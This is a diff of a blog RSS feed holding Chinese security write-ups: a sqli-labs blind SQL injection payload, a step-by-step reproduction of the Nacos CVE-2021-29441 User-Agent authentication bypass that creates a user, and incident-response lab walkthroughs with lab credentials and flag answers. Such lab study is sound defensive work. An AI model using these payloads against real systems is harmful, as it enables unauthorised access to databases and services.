class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--+&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313171431.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313171431&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313171431.png&#34; alt=&#34;Pasted image 20250313171431&#34;&gt;&lt;br&gt;
 7.也可以使用length()来判断数据库名的长度&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -2321,16 +1373,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;://&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;58.128&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sqli&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;labs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Less&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--+&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313194135.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313194135&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313194135.png&#34; alt=&#34;Pasted image 20250313194135&#34;&gt;&lt;/p&gt;
 </description>
         </item>
         <item>
@@ -2339,12 +1382,12 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
         <pubDate>Thu, 28 Aug 2025 00:00:00 +0000</pubDate>
         
         <guid>http://localhost:1313/p/nacoscve-2021-29441-nacos-%E6%9D%83%E9%99%90%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</guid>
-        <description>&lt;img src="http://localhost:1313/images/15.webp" alt="Featured image of post 【Nacos】CVE-2021-29441 Nacos 权限认证绕过漏洞" /&gt;&lt;h1 id=&#34;1-漏洞概述&#34;&gt;1. 漏洞概述
-&lt;/h1&gt;&lt;p&gt;2020年12月29日，Nacos官⽅在github发布的issue中披露Alibaba Nacos 存在⼀个由于不当处理User-Agent导致的未授权访问漏洞 。通过该漏洞，攻击者可以进⾏任意操作，包括&lt;strong&gt;创建新⽤户&lt;/strong&gt;并进⾏登录后操作。&lt;/p&gt;
-&lt;h1 id=&#34;2-影响版本&#34;&gt;2. 影响版本
-&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Nacos &amp;lt;= 2.0.0-ALPHA.1&lt;/strong&gt;&lt;/p&gt;
-&lt;h1 id=&#34;3-环境搭建&#34;&gt;3. 环境搭建
-&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Nacos下载地址(github):&lt;/strong&gt;&lt;/p&gt;
+        <description>&lt;img src="http://localhost:1313/images/15.webp" alt="Featured image of post 【Nacos】CVE-2021-29441 Nacos 权限认证绕过漏洞" /&gt;&lt;h1 id=&#34;1-漏洞概述&#34;&gt;1. 漏洞概述&lt;/h1&gt;
+&lt;p&gt;2020年12月29日，Nacos官⽅在github发布的issue中披露Alibaba Nacos 存在⼀个由于不当处理User-Agent导致的未授权访问漏洞 。通过该漏洞，攻击者可以进⾏任意操作，包括&lt;strong&gt;创建新⽤户&lt;/strong&gt;并进⾏登录后操作。&lt;/p&gt;
+&lt;h1 id=&#34;2-影响版本&#34;&gt;2. 影响版本&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;Nacos &amp;lt;= 2.0.0-ALPHA.1&lt;/strong&gt;&lt;/p&gt;
+&lt;h1 id=&#34;3-环境搭建&#34;&gt;3. 环境搭建&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;Nacos下载地址(github):&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -2400,16 +1443,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;192.168.31.134：自己的内网IP地址
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250704214003.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250704214003.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
 5. 默认账号密码&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -2420,8 +1454,8 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;即可。&lt;/p&gt;
-&lt;h1 id=&#34;4-漏洞复现&#34;&gt;4. 漏洞复现
-&lt;/h1&gt;&lt;ol&gt;
+&lt;h1 id=&#34;4-漏洞复现&#34;&gt;4. 漏洞复现&lt;/h1&gt;
+&lt;ol&gt;
 &lt;li&gt;漏洞路径&lt;/li&gt;
 &lt;/ol&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -2432,16 +1466,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http: your-ip:8848/nacos/v1/auth/users?pageNo=1&amp;amp;pageSize=1
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250704214308.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250704214308.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
 2. 虽然有password了, 但是是加盐过的,解密不了，从上图可以发现，⽬前有⼀个⽤户nacos 漏洞利⽤，访问&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -2451,16 +1476,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http: your-ip:8848/nacos/v1/auth/users
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250704214433.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250704214433.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
 PSOT传参：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -2480,27 +1496,9 @@ PSOT传参：&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;发送POST请求，返回码200，创建⽤户成功~！&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705124923.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705124923.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
 返回Nacos登录界面：&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705125222.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705125222.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;使用账号/密码：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -2510,16 +1508,7 @@ PSOT传参：&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;test1/test1
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705125331.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705125331.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
 关闭环境：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -2529,8 +1518,8 @@ PSOT传参：&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./shutdown.sh
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;5-漏洞分析&#34;&gt;5. 漏洞分析
-&lt;/h1&gt;&lt;p&gt;Nacos-Server是⽤来进⾏服务间的通信的⽩名单。⽐如服务A要访问服务B，如何知道服务A是服务，只需要在服务A访问服务B的时候UA上写成 Nacos-Server 即可。&lt;br&gt;
+&lt;/div&gt;&lt;h1 id=&#34;5-漏洞分析&#34;&gt;5. 漏洞分析&lt;/h1&gt;
+&lt;p&gt;Nacos-Server是⽤来进⾏服务间的通信的⽩名单。⽐如服务A要访问服务B，如何知道服务A是服务，只需要在服务A访问服务B的时候UA上写成 Nacos-Server 即可。&lt;br&gt;
 正因为这样，所以当我们&lt;strong&gt;UA恶意改为Nacos-Server的时候&lt;/strong&gt;，就会被误以为是服务间的通信，因此在⽩名单当中，绕过的认证。&lt;br&gt;
 这⾥⽤的是nacos-2.0.0-ALPHA.1的代码进⾏分析&lt;br&gt;
 关键代码在该⽂件下:&lt;/p&gt;
@@ -2544,21 +1533,12 @@ PSOT传参：&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Filter.java
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705125530.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705125530.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
 TrafficReviseFilter继承了Filter⽤来处理请求，⽽⾥⾯的doFilter的就很明确了。注释中写道，当接收到其他节点服务的请求时应该被通过，如何验证是其他服务。&lt;br&gt;
 就是很简单的⼀个对于UA的⼀个判断逻辑&lt;br&gt;
 这个Constants.NACOS_SERVER_HEADER跟踪⼀下，正是Nacos-Server 经过这⼀层的验证，那么则进⼊到filterChain 过滤器链中的下⼀个filter过滤器，继续接下来的请求。&lt;/p&gt;
-&lt;h1 id=&#34;6-漏洞修复&#34;&gt;6. 漏洞修复
-&lt;/h1&gt;&lt;p&gt;若业务环境允许，使⽤⽩名单限制相关web项⽬的访问来降低⻛险。 官⽅已发布最新安全版本，请及时下载升级⾄安全版本。&lt;/p&gt;
+&lt;h1 id=&#34;6-漏洞修复&#34;&gt;6. 漏洞修复&lt;/h1&gt;
+&lt;p&gt;若业务环境允许，使⽤⽩名单限制相关web项⽬的访问来降低⻛险。 官⽅已发布最新安全版本，请及时下载升级⾄安全版本。&lt;/p&gt;
 </description>
         </item>
         <item>
@@ -2567,8 +1547,8 @@ TrafficReviseFilter继承了Filter⽤来处理请求，⽽⾥⾯的doFilter的�
         <pubDate>Thu, 28 Aug 2025 00:00:00 +0000</pubDate>
         
         <guid>http://localhost:1313/p/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BAvulntarget-j-01/</guid>
-        <description>&lt;img src="http://localhost:1313/images/7.webp" alt="Featured image of post 【应急响应靶场】vulntarget-j-01" /&gt;&lt;h1 id=&#34;简介&#34;&gt;简介
-&lt;/h1&gt;&lt;p&gt;题目来源公众号  vulntarget&lt;/p&gt;
+        <description>&lt;img src="http://localhost:1313/images/7.webp" alt="Featured image of post 【应急响应靶场】vulntarget-j-01" /&gt;&lt;h1 id=&#34;简介&#34;&gt;简介&lt;/h1&gt;
+&lt;p&gt;题目来源公众号  vulntarget&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -2580,29 +1560,11 @@ TrafficReviseFilter继承了Filter⽤来处理请求，⽽⾥⾯的doFilter的�
 &lt;/div&gt;&lt;p&gt;任务环境说明：&lt;br&gt;
 windows账密：&lt;code&gt;workstation/admin@20221123&lt;/code&gt;&lt;br&gt;
 web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
-&lt;h1 id=&#34;flag1&#34;&gt;flag1
-&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;主站进入后台的文件名称？&lt;/strong&gt;&lt;br&gt;
+&lt;h1 id=&#34;flag1&#34;&gt;flag1&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;主站进入后台的文件名称？&lt;/strong&gt;&lt;br&gt;
 查看apache日志，找到php后缀日志。&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250828155204.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250828155217.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250828155204.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250828155217.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -2611,19 +1573,10 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;flag{FNeSOgYGkp.php}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;flag2&#34;&gt;flag2
-&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;黑客是从哪个端口上传木马文件的?&lt;/strong&gt;&lt;br&gt;
+&lt;/div&gt;&lt;h1 id=&#34;flag2&#34;&gt;flag2&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;黑客是从哪个端口上传木马文件的?&lt;/strong&gt;&lt;br&gt;
 打开小皮查看网页端口，7001打不开，所以为80&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250828155247.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250828155247.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -2632,29 +1585,11 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;flag{80}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;flag3&#34;&gt;flag3
-&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;黑客添加的木马文件名称和密码分别是什么，将黑客添加 的木马名称和密码作为flag提交{fag(名称:密码)&lt;/strong&gt;&lt;br&gt;
+&lt;/div&gt;&lt;h1 id=&#34;flag3&#34;&gt;flag3&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;黑客添加的木马文件名称和密码分别是什么，将黑客添加 的木马名称和密码作为flag提交{fag(名称:密码)&lt;/strong&gt;&lt;br&gt;
 直接可以使用D盾扫出该文件。然后使用webshell检测一下，发现确实是webshell后门工具。&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250828155303.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250828155321.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250828155303.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250828155321.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -2663,18 +1598,9 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;flag{api3.php:Admin}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;flag4&#34;&gt;flag4
-&lt;/h1&gt;&lt;p&gt;可以根据日志查看：&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250828155408.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;h1 id=&#34;flag4&#34;&gt;flag4&lt;/h1&gt;
+&lt;p&gt;可以根据日志查看：&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250828155408.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -2692,8 +1618,8 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
         <pubDate>Thu, 28 Aug 2025 00:00:00 +0000</pubDate>
         
         <guid>http://localhost:1313/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAlinux1/</guid>
-        <description>&lt;img src="http://localhost:1313/images/8.webp" alt="Featured image of post 【知攻善防靶场】Linux1" /&gt;&lt;h1 id=&#34;前景需要&#34;&gt;前景需要
-&lt;/h1&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+        <description>&lt;img src="http://localhost:1313/images/8.webp" alt="Featured image of post 【知攻善防靶场】Linux1" /&gt;&lt;h1 id=&#34;前景需要&#34;&gt;前景需要&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
@@ -2716,8 +1642,8 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;账号&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;密码&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;：&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;root&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;defend&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;1-黑客的ip地址&#34;&gt;1. 黑客的IP地址
-&lt;/h1&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;/div&gt;&lt;h1 id=&#34;1-黑客的ip地址&#34;&gt;1. 黑客的IP地址&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
@@ -2729,16 +1655,7 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;可以看出192&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;.168.75.129&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;非常可疑&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;。&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
